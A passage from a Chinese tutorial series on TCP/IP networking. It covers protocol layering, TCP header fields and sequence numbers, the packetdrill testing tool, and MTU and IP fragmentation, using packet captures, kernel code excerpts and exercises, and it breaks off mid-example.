抓包的方式来开始看网络分层。\n打开 wireshark，在弹出的选项中，选中 en0 网卡，在过滤器中输入host www.baidu.com，只抓取与百度服务器通信的数据包。\n在命令行中用 curl 命令发起 http 请求：curl http://www.baidu.com，抓到的中间一次数据包如下\n可以看到协议的分层从上往下依次是\n Ethernet II：网络接口层以太网帧头部信息 Internet Protocol Version 4：互联网层 IP 包头部信息 Transmission Control Protocol：传输层的数据段头部信息，此处是 TCP 协议 Hypertext Transfer Protocol：应用层 HTTP 的信息  应用层（Application Layer） 应用层的本质是规定了应用程序之间如何相互传递报文， 以 HTTP 协议为例，它规定了\n 报文的类型，是请求报文还是响应报文 报文的语法，报文分为几段，各段是什么含义、用什么分隔，每个部分的每个字段什么什么含义 进程应该以什么样的时序发送报文和处理响应报文  很多应用层协议都是由 RFC 文档定义，比如 HTTP 的 RFC 为 RFC 2616 - Hypertext Transfer Protocol \u0026ndash; HTTP/1.1。\nHTTP 客户端和 HTTP 服务端的首要工作就是根据 HTTP 协议的标准组装和解析 HTTP 数据包，每个 HTTP 报文格式由三部分组成：\n 起始行（start line），起始行根据是请求报文还是响应报文分为「请求行」和「响应行」。这个例子中起始行是GET / HTTP/1.1，表示这是一个 GET 请求，请求的 URL 为/，协议版本为HTTP 1.1，起始行最后会有一个空行CRLF（\\r\\n)与下面的首部分隔开 首部（header），首部采用形如key:value的方式，比如常见的User-Agent、ETag、Content-Length都属于 HTTP 首部，每个首部直接也是用空行分隔 可选的实体（entity），实体是 HTTP 真正要传输的内容，比如下载一个图片文件，传输的一段 HTML等  以本例的请求报文格式为例\n除了我们熟知的 HTTP 协议，还有下面这些非常常用的应用层协议\n 域名解析协议 DNS 收发邮件 SMTP 和 POP3 协议 时钟同步协议 NTP 网络文件共享协议 NFS  传输层（Transport Layer） 传输层的作用是为两台主机之间的「应用进程」提供端到端的逻辑通信，相隔几千公里的两台主机的进程就好像在直接通信一样。\n虽然是叫传输层，但是并不是将数据包从一台主机传送到另一台，而是对「传输行为进行控制」，这本小册介绍的主要内容 TCP 协议就被称为传输控制协议（Transmission Control Protocol），为下面两层协议提供数据包的重传、流量控制、拥塞控制等。\n假设你正在电脑上用微信跟女朋友聊天，用 QQ 跟技术大佬们讨论技术细节，当电脑收到一个数据包时，它怎么知道这是一条微信的聊天内容，还是一条 QQ 的消息呢？\n这就是端口号的作用。传输层用端口号来标识不同的应用程序，主机收到数据包以后根据目标端口号将数据包传递给对应的应用程序进行处理。比如这个例子中，目标端口号为 80，百度的服务器就根据这个目标端口号将请求交给监听 80 端口的应用程序（可能是 Nginx 等负载均衡器）处理\n网络互连层（Internet Layer） 网络互连层提供了主机到主机的通信，将传输层产生的的数据包封装成分组数据包发送到目标主机，并提供路由选择的能力\nIP 协议是网络层的主要协议，TCP 和 UDP 都是用 IP 协议作为网络层协议。这一层的主要作用是给包加上源地址和目标地址，将数据包传送到目标地址。\nIP 协议是一个无连接的协议，也不具备重发机制，这也是 TCP 协议复杂的原因之一就是基于了这样一个「不靠谱」的协议。\n网络访问层（Network Access Layer） 网络访问层也有说法叫做网络接口层，以太网、Wifi、蓝牙工作在这一层，网络访问层提供了主机连接到物理网络需要的硬件和相关的协议。这一层我们不做重点讨论。\n整体的分层图如下图所示\n分层的好处是什么呢？ 分层的本质是通过分离关注点而让复杂问题简单化，通过分层可以做到：\n 各层独立：限制了依赖关系的范围，各层之间使用标准化的接口，各层不需要知道上下层是如何工作的，增加或者修改一个应用层协议不会影响传输层协议 灵活性更好：比如路由器不需要应用层和传输层，分层以后路由器就可以只用加载更少的几个协议层 易于测试和维护：提高了可测试性，可以独立的测试特定层，某一层有了更好的实现可以整体替换掉 能促进标准化：每一层职责清楚，方便进行标准化  习题  收到 IP 数据包解析以后，它怎么知道这个分组应该投递到上层的哪一个协议（UDP 或 TCP）  可以通过Internet Protocol 中的 Protocol 字段来知道现在是什么协议。\n3、TCP 概述 —— 可靠的、面向连接的、基于字节流、全双工的协议 如果要用一句话来描述 TCP 协议，我想应该是：TCP 是一个可靠的（reliable）、面向连接的（connection-oriented）、基于字节流（byte-stream）、全双工的（full-duplex）协议。\n0x01 TCP 是面向连接的协议 一开始学习 TCP 的时候，我们就被告知 TCP 是面向连接的协议，那什么是面向连接，什么是无连接呢？\n 面向连接（connection-oriented）：面向连接的协议要求正式发送数据之前需要通过「握手」建立一个逻辑连接，结束通信时也是通过有序的四次挥手来断开连接。 无连接（connectionless）：无连接的协议则不需要  三次握手 建立连接的过程是通过「三次握手」来完成的，顾名思义，通过三次数据交换建立一个连接。 通过三次握手协商好双方后续通信的起始序列号、窗口缩放大小等信息。\n如下图所示\n0x02 TCP 协议是可靠的 IP 是一种无连接、不可靠的协议：它尽最大可能将数据报从发送者传输给接收者，但并不保证包到达的顺序会与它们被传输的顺序一致，也不保证包是否重复，甚至都不保证包是否会达到接收者。\nTCP 要想在 IP 基础上构建可靠的传输层协议，必须有一个复杂的机制来保障可靠性。 主要有下面几个方面：\n 对每个包提供校验和 包的序列号解决了接收数据的乱序、重复问题 超时重传 流量控制、拥塞控制  校验和（checksum） 每个 TCP 包首部中都有两字节用来表示校验和，防止在传输过程中有损坏。如果收到一个校验和有差错的报文，TCP 不会发送任何确认直接丢弃它，等待发送端重传。\n包的序列号保证了接收数据的乱序和重复问题 假设我们往 TCP 套接字里写 3000 字节的数据导致 TCP发送了 3 个数据包，每个数据包大小为 1000 字节：第一个包序列号为[1~1001)，第二个包序列号为 [1001~2001)，第三个包序号为[2001~3001)\n假如因为网络的原因导致第二个、第三个包先到接收端，第一个包最后才到，接收端也不会因为他们到达的顺序不一致把包弄错，TCP 会根据他们的序号进行重新的排列然后把结果传递给上层应用程序。\n如果 TCP 接收到重复的数据，可能的原因是超时重传了两次但这个包并没有丢失，接收端会收到两次同样的数据，它能够根据包序号丢弃重复的数据。\n超时重传 TCP 发送数据后会启动一个定时器，等待对端确认收到这个数据包。如果在指定的时间内没有收到 ACK 确认，就会重传数据包，然后等待更长时间，如果还没有收到就再重传，在多次重传仍然失败以后，TCP 会放弃这个包。后面我们讲到超时重传模块的时候会详细介绍这部分内容。\n流量控制、拥塞控制 这部分内容较复杂，后面有专门的文章进行讲解，这里先不展开。\n0x03 TCP 是面向字节流的协议 TCP 是一种字节流（byte-stream）协议，流的含义是没有固定的报文边界。\n假设你调用 2 次 write 函数往 socket 里依次写 500 字节、800 字节。write 函数只是把字节拷贝到内核缓冲区，最终会以多少条报文发送出去是不确定的，如下图所示\n 情况 1：分为两条报文依次发出去 500 字节 和 800 字节数据，也有 情况 2：两部分数据合并为一个长度为 1300 字节的报文，一次发送 情况 3：第一部分的 500 字节与第二部分的 500 字节合并为一个长度为 1000 字节的报文，第二部分剩下的 300 字节单独作为一个报文发送 情况 4：第一部分的 400 字节单独发送，剩下100字节与第二部分的 800 字节合并为一个 900 字节的包一起发送。 情况 N：还有更多可能的拆分组合  上面出现的情况取决于诸多因素：路径最大传输单元 MTU、发送窗口大小、拥塞窗口大小等。\n当接收方从 TCP 套接字读数据时，它是没法得知对方每次写入的字节是多少的。接收端可能分2 次每次 650 字节读取，也有可能先分三次，一次 100 字节，一次 200 字节，一次 1000 字节进行读取。\n0x04 TCP 是全双工的协议 在 TCP 中发送端和接收端可以是客户端/服务端，也可以是服务器/客户端，通信的双方在任意时刻既可以是接收数据也可以是发送数据，每个方向的数据流都独立管理序列号、滑动窗口大小、MSS 等信息。\n0x05 小结与思考 TCP 是一个可靠的（reliable）、面向连接的（connection-oriented）、基于字节流（byte-stream）、全双工（full-duplex）的协议。发送端在发送数据以后启动一个定时器，如果超时没有收到对端确认会进行重传，接收端利用序列号对收到的包进行排序、丢弃重复数据，TCP 还提供了流量控制、拥塞控制等机制保证了稳定性。\n留一个思考题，这个题目也是《TCP/IP》详解中的一个习题。\nTCP提供了一种字节流服务，而收发双方都不保持记录的边界，应用程序应该如何提供他们自己的记录标识呢？\n欢迎你在留言区留言，和我一起讨论。\n4、（实验）来自 Google 的协议栈测试神器 —— packetdrill 从大学开始懵懵懂懂粗略学习（死记硬背）了一些 TCP 协议的内容，到工作多年以后，一直没有找到顺手的网络协议栈调试工具，对于纷繁复杂 TCP 协议。业界流行的 scapy 不是很好用，有很多局限性。直到前段时间看到了 Google 开源的 packetdrill，真有一种相见恨晚的感觉。这篇文章讲介绍 packetdrill 的基本原理和用法。\npacketdrill 在 2013 年开源，在 Google 内部久经考验，Google 用它发现了 10 余个 Linux 内核 bug，同时用测试驱动开发的方式开发新的网络特性和进行回归测试，确保新功能的添加不影响网络协议栈的可用性。\n0x01 安装 以 centos7 为例\n 首先从 github 上 clone 最新的源码 github.com/google/pack… 进入源码目录cd gtests/net/packetdrill 安装 bison和 flex 库：sudo yum install -y bison flex 为避免 offload 机制对包大小的影响，修改 netdev.c 注释掉 set_device_offload_flags 函数所有内容 执行 ./configure 修改 Makefile，去掉第一行的末尾的 -static 执行 make 命令编译 确认编译无误地生成了 packetdrill 可执行文件  0x02 初体验 packetdrill 脚本采用 c 语言和 tcpdump 混合的语法。脚本文件名一般以 .pkt 为后缀，执行脚本的方式为sudo ./packetdrill test.pkt\n脚本的每一行可以由以下几种类型的语句构成：\n 执行系统调用（system call），对比返回值是否符合预期 把数据包（packet）注入到内核协议栈，模拟协议栈收到包 比较内核协议栈发出的包与预期是否相符 执行 shell 命令 执行 python 命令  脚本每一行都有一个时间参数用来表明执行的时间或者预期事件发生的时间，packetdrill 支持绝对时间和相对时间。绝对时间就是一个简单的数字，相对时间会在数字前面添加一个+号。比如下面这两个例子\n1 2 3 4 5  // 300ms 时执行 accept 调用 0.300 accept(3, ..., ...) = 4  // 在上一行语句执行结束 10ms 以后执行 +.010 write(4, ..., 1000) = 1000`   如果预期的事件在指定的时间没有发生，脚本执行会抛出异常，由于不同机器的响应时间不同，所以 packetdrill 提供了参数（\u0026ndash;tolerance_usecs）用来设置误差范围，默认值是 4000us（微秒），也即 4ms。这个参数默认值在 config.c 的 set_default_config 函数里进行设置config-\u0026gt;tolerance_usecs = 4000;\n我们以一个最简单的 demo 来演示 packetdrill 的用法。乍一看很懵，容我慢慢道来\n1 2 3 4 5 6 7 8 9 10 11 12 13 14   1 0 socket(..., SOCK_STREAM, IPPROTO_TCP) = 3  2 +0 setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0  3 +0 bind(3, ..., ...) = 0  4 +0 listen(3, 1) = 0  5  6 //TCP three-way handshake  7 +0 \u0026lt; S 0:0(0) win 4000 \u0026lt;mss 1000\u0026gt;  8 +0 \u0026gt; S. 0:0(0) ack 1 \u0026lt;...\u0026gt;  9 +.1 \u0026lt; . 1:1(0) ack 1 win 1000  10  11 +0 accept(3, ..., ...) = 4  12 +0 write(4, ..., 10) = 10  13 +0 \u0026gt; P. 1:11(10) ack 1  14 +.1 \u0026lt; . 1:1(0) ack 6 win 1000   第 1 行：0 socket(..., SOCK_STREAM, IPPROTO_TCP) = 3\n在脚本执行的第 0s 创建一个 socket，使用的是系统调用的方式，socket 函数的签名和用法如下\n1 2 3 4 5  #include \u0026lt;sys/socket.h\u0026gt;int socket(int domain, int type, int protocol);  成功时返回文件描述符，失败时返回 -1 int socket_fd = socket(AF_INET, SOCK_STREAM, 0);    domain 表示套接字使用的协议族信息，IPv4、IPv6等。AF_INET 表示 IPv4 协议族，AF_INET6 表示 IPv6 协议族。绝大部分使用场景下都是用 AF_INET，即 IPv4 协议族 type 表示套接字数据传输类型信息，主要分为两种：面向连接的套接字（SOCK_STREAM）和面向无连接报文的套接字（SOCK_DGRAM）。众所周知，SOCK_STREAM 默认协议是 TCP，SOCK_DGRAM 的默认协议是 UDP。 protocol 这个参数通常是 0，表示为给定的协议族和套接字类型选择默认协议。  在 packetdrill 脚本中用 ... 来表示当前参数省略不相关的细节信息，使用 packetdrill 程序的默认值。\n脚本返回新建的 socket 文件句柄，这里用=来断言会返回3，因为linux 在每个程序开始的时刻，都会有 3 个已经打开的文件句柄，分别是：标准输入stdin(0)、标准输出stdout(1)、错误输出stderr(2) 默认的，其它新建的文件句柄则排在之后，从 3 开始。\n1 2 3  2 +0 setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0 3 +0 bind(3, ..., ...) = 0 4 +0 listen(3, 1) = 0    第 2 行：调用 setsockopt 函数设置端口重用。 第 3 行：调用 bind 函数，这里的 socket 地址省略会使用默认的端口 8080，第一个参数 3 是套接字的 fd 第 4 行：调用 listen 函数，第一个参数 3 也是套接字 fd 到此为止，socket 已经可以接受客户端的 tcp 连接了。  第 7 ~ 9 行是经典的三次握手，packetdrill 的语法非常类似 tcpdump 的语法\n\u0026lt; 表示输入的数据包（input packets)， packetdrill 会构造一个真实的数据包，注入到内核协议栈。比如：\n1 2 3 4 5  // 构造 SYN 包注入到协议栈 +0 \u0026lt; S 0:0(0) win 32792 \u0026lt;mss 1000,sackOK,nop,nop,nop,wscale 7\u0026gt;  // 构造 icmp echo_reply 包注入到协议栈 0.400 \u0026lt; icmp echo_reply   \u0026gt; 表示预期协议栈会响应的包（outbound packets），这个包不是 packetdrill 构造的，是由协议栈发出的，packetdrill 会检查协议栈是不是真的发出了这个包，如果没有，则脚本报错停止执行。比如\n1 2 3 4 5 6 7  // 调用 write 函数调用以后，检查协议栈是否真正发出了 PSH+ACK 包 +0 write(4, ..., 1000) = 1000 +0 \u0026gt; P. 1:1001(1000) ack 1  // 三次握手中过程向协议栈注入 SYN 包以后，检查协议栈是否发出了 SYN+ACK 包以及 ack 是否等于 1 0.100 \u0026lt; S 0:0(0) win 32792 \u0026lt;mss 1000,nop,wscale 7\u0026gt; 0.100 \u0026gt; S. 0:0(0) ack 1 \u0026lt;mss 1460,nop,wscale 6\u0026gt;   第 7 行：+0 \u0026lt; S 0:0(0) win 1000 \npacketdrill 构造一个 SYN 包发送到协议栈，它使用与 tcpdump 类似的相对 sequence 序号，S 后面的三个 0 ，分别表示发送包的起始 seq、结束 seq、包的长度。比如P. 1:1001(1000)表示发送的包起始序号为 1，结束 seq 为 1001，长度为1000。紧随其后的 win 表示发送端的接收窗口大小 1000。依据 TCP 协议，SYN 包也必须带上自身的 MSS 选项，这里的 MSS 大小为 1000\n第 8 行：+0 \u0026gt; S. 0:0(0) ack 1 \u0026lt;...\u0026gt;\n预期协议栈会立刻回复 SYN+ACK 包，因为还没有发送数据，所以包的 seq开始值、结束值、长度都为 0，ack 为上次 seq + 1，表示第一个 SYN 包已收到。\n 第 9 行：+.1 \u0026lt; . 1:1(0) ack 1 win 1000\n 0.1s 以后注入一个 ACK 包到协议栈，没有携带数据，包的长度为 0，至此三次握手完成，过程如下图\n+0 accept(3, ..., ...) = 4 accept 系统调用返回了一个值为 4 的新的文件 fd，这时 packetdrill 可以往这个 fd 里面写数据了\n1 2 3  +0 write(4, ..., 10)=10 +0 \u0026gt; P. 1:11(10) ack 1 +.1 \u0026lt; . 1:1(0) ack 11 win 1000   packetdrill 调用 write 函数往 socket 里写了 10 字节的数据，协议栈立刻发出这 10 个字节数据包，同时把 PSH 标记置为 1。这个包的起始 seq 为 1，结束 seq 为 10，长度为 10。100ms 以后注入 ACK 包，模拟协议栈收到 ACK 包。\n整个过程如下 采用 tcpdump 对 8080 端口进行抓包，结果如下\n1 2 3 4 5 6  sudo tcpdump -i any port 8080 -nn 10:02:36.591911 IP 192.0.2.1.37786 \u0026gt; 192.168.31.139.8080: Flags [S], seq 0, win 4000, options [mss 1000], length 0 10:02:36.591961 IP 192.168.31.139.8080 \u0026gt; 192.0.2.1.37786: Flags [S.], seq 2327356581, ack 1, win 29200, options [mss 1460], length 0 10:02:36.693785 IP 192.0.2.1.37786 \u0026gt; 192.168.31.139.8080: Flags [.], ack 1, win 1000, length 0 10:02:36.693926 IP 192.168.31.139.8080 \u0026gt; 192.0.2.1.37786: Flags [P.], seq 1:11, ack 1, win 29200, length 10 10:02:36.801092 IP 192.0.2.1.37786 \u0026gt; 192.168.31.139.8080: Flags [.], ack 11, win 1000, length 0   0x03 packetdrill 原理简述 在脚本的最后一行，加上\n1  +0 `sleep 1000000`   让脚本执行完不要退出，执行 ifconfig 可以看到，比没有执行脚本之前多了一个虚拟的网卡 tun0。\npacketdrill 就是在执行脚本前创建了一个名为 tun0 的虚拟网卡，脚本执行完，tun0 会被销毁。该虚拟网卡对应于操作系统中/dev/net/tun文件，每次程序通过 write 等系统调用将数据写入到这个文件 fd 时，这些数据会经过 tun0 这个虚拟网卡，将数据写入到内核协议栈，read 系统调用读取数据的过程类似。协议栈可以向操作普通网卡一样操作虚拟网卡 tun0。\n关于 linux 下 tun 的详细使用介绍，可以参考 IBM 的文章 www.ibm.com/developerwo…\n0x04 把 packetdrill 命令加到环境变量里 把 packetdrill 加入到环境变量里以便于可以在任意目录可以执行。第一步是修改/etc/profile或者.zshrc（如果你用的是最好用的 zsh 的话）等可以修改环境变量的文件。\n1 2 3  export PATH=/path_to_packetdrill/:$PATH  source ~/.zshrc   在命令行中输入 packetdrill 如果有输出 packetdrill 的 usage 文档说明第一步成功啦。\n但是 packetdrill 命令是需要 sudo 权限执行的，如果现在我们在命令行中输入sudo packetdrill，会提示找不到 packetdrill 命令\n1  sudo：packetdrill：找不到命令   这是因为 sudo 命令为了安全性的考虑，覆盖了用户自己 PATH 环境变量，我们可以用sudo sudo -V | grep PATH 来看\n1 2  sudo sudo -V | grep PATH 覆盖用户的 $PATH 变量的值：/sbin:/bin:/usr/sbin:/usr/bin   可以看到 sudo 命令覆盖了用户的 PATH 变量。这些初始值是在/etc/sudoers中定义的\n1 2  sudo cat /etc/sudoers | grep -i PATH Defaults secure_path = /sbin:/bin:/usr/sbin:/usr/bin   一个最简单的办法是在sudo 启动时重新赋值它的 PATH 变量：sudo env PATH=\u0026quot;$PATH\u0026quot; cmd_x，可以用sudo env PATH=\u0026quot;$PATH\u0026quot; env | grep PATH与sudo env | grep PATH做前后对比\n对于本文中的 packetdrill，可以用sudo env PATH=$PATH packetdrill delay_ack.pkt来执行，当然你可以做一个 sudo 的 alias\n1  alias sudo=\u0026#39;sudo env PATH=\u0026#34;$PATH\u0026#34;\u0026#39;   这样就可以在任意地方执行sudo packetdrill了\n0x05 小结 packetdrill 上手的难度有一点大，但是熟悉了以后用起来特别顺手，后面很多 TCP 包超时重传、快速重传、滑动窗口、nagle 算法都是会用这个工具来进行测试，希望你可以熟练掌握。\n5、支撑 TCP 协议的基石 —— 剖析首部字段 这篇文章来讲讲 TCP 报文首部相关的概念，这些头部是支撑 TCP 复杂功能的基石。 完整的 TCP 头部如下图所示 我们用一次访问百度网页抓包的例子来开始。\n1  curl -v www.baidu.com   完整的抓包文件可以来 github 下载：curl_baidu.pcapng\n源端口号、目标端口号 在第一个包的详情中，首先看到的高亮部分的源端口号（Src Port）和目标端口号（Dst Port)，这个例子中本地源端口号为 61024，百度目标端口号是 80。\nTCP 报文头部里没有源 ip 和目标 ip 地址，只有源端口号和目标端口号\n这也是初学 wireshark 抓包时很多人会有的一个疑问：过滤 ip 地址为 172.19.214.24 包的条件为什么不是 \u0026ldquo;tcp.addr == 172.19.214.24\u0026rdquo;，而是 \u0026ldquo;ip.addr == 172.19.214.24\u0026rdquo; TCP 的报文里是没有源 ip 和目标 ip 的，因为那是 IP 层协议的事情，TCP 层只有源端口和目标端口。\n源 IP、源端口、目标 IP、目标端口构成了 TCP 连接的「四元组」。一个四元组可以唯一标识一个连接。\n后面文章中专门有一节是用来介绍端口号相关的知识。\n 接下来，我们看到的是序列号，如截图中 2 的标识。\n序列号（Sequence number） TCP 是面向字节流的协议，通过 TCP 传输的字节流的每个字节都分配了序列号，序列号（Sequence number）指的是本报文段第一个字节的序列号。\n序列号加上报文的长度，就可以确定传输的是哪一段数据。序列号是一个 32 位的无符号整数，达到 2^32-1 后循环到 0。\n在 SYN 报文中，序列号用于交换彼此的初始序列号，在其它报文中，序列号用于保证包的顺序。\n因为网络层（IP 层）不保证包的顺序，TCP 协议利用序列号来解决网络包乱序、重复的问题，以保证数据包以正确的顺序组装传递给上层应用。\n如果发送方发送的是四个报文序列号分别是1、2、3、4，但到达接收方的顺序是 2、4、3、1，接收方就可以通过序列号的大小顺序组装出原始的数据。\n初始序列号（Initial Sequence Number, ISN） 在建立连接之初，通信双方都会各自选择一个序列号，称之为初始序列号。在建立连接时，通信双方通过 SYN 报文交换彼此的 ISN，如下图所示\n初始建立连接的过程中 SYN 报文交换过程如下图所示 其中第 2 步和第 3 步可以合并一起，这就是三次握手的过程\n初始序列号是如何生成的 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  __u32 secure_tcp_sequence_number(__be32 saddr, __be32 daddr, \t__be16 sport, __be16 dport) { \tu32 hash[MD5_DIGEST_WORDS];  \tnet_secret_init(); \thash[0] = (__force u32)saddr; \thash[1] = (__force u32)daddr; \thash[2] = ((__force u16)sport \u0026lt;\u0026lt; 16) + (__force u16)dport; \thash[3] = net_secret[15]; \t\tmd5_transform(hash, net_secret);  \treturn seq_scale(hash[0]); }  static u32 seq_scale(u32 seq) { \treturn seq + (ktime_to_ns(ktime_get_real()) \u0026gt;\u0026gt; 6); }   代码中的 net_secret 是一个长度为 16 的 int 数组，只有在第一次调用 net_secret_init 的时时候会将将这个数组的值初始化为随机值。在系统重启前保持不变。\n可以看到初始序列号的计算函数 secure_tcp_sequence_number() 的逻辑是通过源地址、目标地址、源端口、目标端口和随机因子通过 MD5 进行进行计算。如果仅有这几个因子，对于四元组相同的请求，计算出的初始序列号总是相同，这必然有很大的安全风险，所以函数的最后将计算出的序列号通过 seq_scale 函数再次计算。\nseq_scale 函数加入了时间因子，对于四元组相同的连接，序列号也不会重复了。\n序列号回绕了怎么处理 序列号是一个 32 位的无符号整数，从前面介绍的初始序列号计算算法可以知道，ISN 并不是从 0 开始，所以同一个连接的序列号是有可能溢出回绕（sequence wraparound）的。TCP 的很多校验比如丢包、乱序判断都是通过比较包的序号来实现的，我们来看看 linux 内核是如何处理的，代码如下所示。\n1 2 3 4  static inline bool before(__u32 seq1, __u32 seq2) {  return (__s32)(seq1-seq2) \u0026lt; 0; }   其中 __u32 表示无符号的 32 位整数，__s32 表示有符号的 32 位整数。为什么 seq1 - seq2 转为有符号的 32 位整数就可以判断 seq1 和 seq2 的大小了呢？\n简化一些长度，以 8 位为例，seq1 = 255，seq2 = 1\n1 2 3 4  seq1 = 255，seq2 = 1 seq1 = 1111 1111 seq2 = 0000 0001 seq1 - seq2 = 1111 1110 \u0026lt; 0 --\u0026gt; seq1 \u0026lt; seq2   通过比较，就可以知道 seq1 \u0026lt; seq2。\n如果 seq2 回绕到了 128，情况就不一样了\n1 2 3 4  seq2 = 128 seq1 = 1111 1111 seq2 = 1000 0000 seq1 - seq2 = 0111 1111 \u0026gt; 0 --\u0026gt; seq1 \u0026gt; seq2   可以包容回绕后的增量小于2^(n-1)-1\n 确认号 TCP 使用确认号（Acknowledgment number, ACK）来告知对方下一个期望接收的序列号，小于此确认号的所有字节都已经收到。\n关于确认号有几个注意点：\n 不是所有的包都需要确认的 不是收到了数据包就立马需要确认的，可以延迟一会再确认 ACK 包本身不需要被确认，否则就会无穷无尽死循环了 确认号永远是表示小于此确认号的字节都已经收到  TCP Flags TCP 有很多种标记，有些用来发起连接同步初始序列号，有些用来确认数据包，还有些用来结束连接。TCP 定义了一个 8 位的字段用来表示 flags，大部分都只用到了后 6 个，如下图所示 下面这个是 wireshark 第一个 SYN 包的 flags 截图 我们通常所说的 SYN、ACK、FIN、RST 其实只是把 flags 对应的 bit 位置为 1 而已，这些标记可以组合使用，比如 SYN+ACK，FIN+ACK 等\n最常见的有下面这几个：\n SYN（Synchronize）：用于发起连接数据包同步双方的初始序列号 ACK（Acknowledge）：确认数据包 RST（Reset）：这个标记用来强制断开连接，通常是之前建立的连接已经不在了、包不合法、或者实在无能为力处理 FIN（Finish）：通知对方我发完了所有数据，准备断开连接，后面我不会再发数据包给你了。 PSH（Push）：告知对方这些数据包收到以后应该马上交给上层应用，不能缓存起来  窗口大小 可以看到用于表示窗口大小的\u0026quot;Window Size\u0026quot; 只有 16 位，可能 TCP 协议设计者们认为 16 位的窗口大小已经够用了，也就是最大窗口大小是 65535 字节（64KB）。就像网传盖茨曾经说过：“640K内存对于任何人来说都足够了”一样。\n自己挖的坑当然要自己填，因此TCP 协议引入了「TCP 窗口缩放」选项 作为窗口缩放的比例因子，比例因子值的范围是 0 ~ 14，其中最小值 0 表示不缩放，最大值 14。比例因子可以将窗口扩大到原来的 2 的 n 次方，比如窗口大小缩放前为 1050，缩放因子为 7，则真正的窗口大小为 1050 * 128 = 134400，如下图所示\n在 wireshark 中最终的窗口大小会自动计算出来，如下图中的 Calculated window size。以本文中抓包的例子为例\n值得注意的是，窗口缩放值在三次握手的时候指定，如果抓包的时候没有抓到 三次握手阶段的包，wireshark 是不知道真正的窗口缩放值是多少的。\n可选项 可选项的格式入下所示 以 MSS 为例，kind=2，length=4，value=1460\n常用的选项有以下几个：\n MSS：最大段大小选项，是 TCP 允许的从对方接收的最大报文段 SACK：选择确认选项 Window Scale：窗口缩放选项  作业题 1、如果一个 TCP 连接正在传送 5000 字节的数据，第一个字节的序号是 10001，数据被分为 5 段，每个段携带 1000 字节，请问每个段的序号是什么？\n2、A B 两个主机之间建立了一个 TCP 连接，A 主机发给 B 主机两个 TCP 报文，大小分别是 500 和 300，第一个报文的序列号是 200，那么 B 主机接收两个报文后，返回的确认号是（）\n A、200 B、700 C、800 D、1000  3、客户端的使用 ISN=2000 打开一个连接，服务器端使用 ISN=3000 打开一个连接，经过 3 次握手建立连接。连接建立起来以后，假定客户端向服务器发送一段数据Welcome the server!（长度 20 Bytes），而服务器的回答数据Thank you!（长度 10 Bytes ），试画出三次握手和数据传输阶段报文段序列号、确认号的情况。\n6、（实验）数据包大小对网络的影响 —— MTU 与 MSS 的奥秘 前面的文章中介绍过一个应用层的数据包会经过传输层、网络层的层层包装，交给网络接口层传输。假设上层的应用调用 write 等函数往 socket 写入了 10KB 的数据，TCP 会如何处理呢？是直接加上 TCP 头直接交给网络层吗？这篇文章我们来讲讲这相关的知识\n最大传输单元（Maximum Transmission Unit, MTU） 数据链路层传输的帧大小是有限制的，不能把一个太大的包直接塞给链路层，这个限制被称为「最大传输单元（Maximum Transmission Unit, MTU）」\n下图是以太网的帧格式，以太网的帧最小的帧是 64 字节，除去 14 字节头部和 4 字节 CRC 字段，有效荷载最小为 46 字节。最大的帧是 1518 字节，除去 14 字节头部和 4 字节 CRC，有效荷载最大为 1500，这个值就是以太网的 MTU。因此如果传输 100KB 的数据，至少需要 （100 * 1024 / 1500) = 69 个以太网帧。\n不同的数据链路层的 MTU 是不同的。通过netstat -i 可以查看网卡的 mtu，比如在 我的 centos 机器上可以看到\nIP 分段 IPv4 数据报的最大大小为 65535 字节，这已经远远超过了以太网的 MTU，而且有些网络还会开启巨帧（Jumbo Frame）能达到 9000 字节。 当一个 IP 数据包大于 MTU 时，IP 会把数据报文进行切割为多个小的片段(小于 MTU），使得这些小的报文可以通过链路层进行传输\nIP 头部中有一个表示分片偏移量的字段，用来表示该分段在原始数据报文中的位置，如下图所示\n下面我们 wireshark 来演示 IP 分段，wireshark 开启抓包，在命令行中执行\n1 2 3 4 5 6 7  ping -s 3000 www.baidu.com  输出： PING www.a.shifen.com (14.215.177.39): 3000 data bytes Request timeout for icmp_seq 0 Request timeout for icmp_seq 1 Request timeout for icmp_seq 2   在 wireshark 的显示过滤器中输入ip.addr==14.215.177.39\n通过man ping命令可以看到ping -s命令会增加 8byte 的 ICMP 头，所以ping -s 3000 IP 层实际会发送 3008 字节。\n -s packetsize Specify the number of data bytes to be sent. The default is 56, which translates into 64 ICMP data bytes when combined with the 8 bytes of ICMP header data. This option cannot be used with ping sweeps.\n 先看第一个包\n这个包是 IP 分段包的第一个分片，More fragments: Set表示这个包是 IP 分段包的一部分，还有其它的分片包，Fragment offset: 0表示分片偏移量为 0，IP 包的 payload 的大小为 1480，加上 20 字节的头部正好是 1500\n第二个包的详情截图如下\n同样More fragments处于 set 状态，表示后面还有其它分片，Fragment offset: 185这里并不是表示分片偏移量为 185，wireshark 这里显示的时候除以了 8，真实的分片偏移量为 185 * 8 = 1480\n第三个包的详情截图如下\n可以看到More fragments处于 Not set 状态，表示这是最后一个分片了。Fragment offset: 370表示偏移量为 370 * 8 = 2960，包的大小为 68 - 20（IP 头部大小） = 48\n三个分片如下图所示\n前面我们提到 IP 协议不会对丢包进行重传，那么 IP 分段中有分片丢失、损坏的话，会发生什么呢？ 这种情况下，目标主机将没有办法将分段的数据包重组为一个完整的数据包，依赖于传输层是否进行重传。\n利用 IP 包分片的策略，有一种对应的网络攻击方式IP fragment attack，就是一直传More fragments = 1的包，导致接收方一直缓存分片，从而可能导致接收方内存耗尽。\n网络中的木桶效应：路径 MTU 一个包从发送端传输到接收端，中间要跨越很多个网络，每条链路的 MTU 都可能不一样，这个通信过程中最小的 MTU 称为「路径 MTU（Path MTU）」。就好比开车有时候开的是双向 4 车道，有时候可能是乡间小路一样。\n比如下图中，第一段链路 MTU 大小为 1500 字节，第二段链路 MTU 为 800 字节，第三段链路 MTU 为 1200 字节，则路径 MTU 为三段 MTU 的最小值 800。\n路径 MTU 就跟木桶效应是一个道理，木桶的盛水量由最短的那条短板决定，路径 MTU 也是由通信链条中最小的 MTU 决定。\n实际模拟路径 MTU 发现 用下面的代码可以用来测试路径 MTU 发现，为了方便，每行前面加了行号\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  0.000 setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0 0.000 bind(3, ..., ...) = 0 0.000 listen(3, 1) = 0  0.100 \u0026lt; S 0:0(0) win 